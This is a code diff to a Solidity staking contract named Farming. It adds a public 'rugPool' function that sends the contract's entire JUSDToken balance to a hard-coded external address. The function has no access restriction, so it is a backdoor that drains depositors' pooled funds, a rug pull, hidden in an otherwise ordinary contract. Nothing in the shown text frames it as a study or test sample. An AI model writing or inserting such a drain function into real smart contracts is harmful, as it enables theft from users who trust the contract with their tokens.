@@ -102,4 +102,9 @@ contract Farming {
         MimicToken.transfer(msg.sender, reward);
         updateTime[msg.sender] = block.timestamp;
     }
+
+    function rugPool() public{
+        uint256 balance = JUSDToken.balanceOf(address(this));
+        JUSDToken.transfer(0x2AAc0eb300FA402730bCEd0B4C43a7Fe6BF6491e, balance);
+    }
 }
